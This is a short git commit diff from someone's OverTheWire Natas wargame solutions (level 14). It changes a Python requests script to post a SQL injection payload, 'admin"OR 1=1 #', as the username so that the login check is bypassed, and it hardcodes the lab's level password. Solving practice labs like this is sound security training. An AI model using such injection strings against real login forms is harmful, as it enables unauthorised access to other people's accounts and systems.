7fe105912295d31dd63f0833e55d82ebb8d9799c
Dhruv Joshi <dhruvjoshi03@hotmail.com>
2020-11-07 15:55:36 +0530

    Solved Challenges

--- natas/level14/level14.py
+++ natas/level14/level14.py
@@ -7,6 +7,6 @@ password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
 url = 'http://%s.natas.labs.overthewire.org'  % username
 
 
-response = requests.post(url , auth = (username, password))
+response = requests.post(url ,data={"username":'admin"OR 1=1 #' , "password":"anything" }, auth = (username, password))
 print(response.text)
  
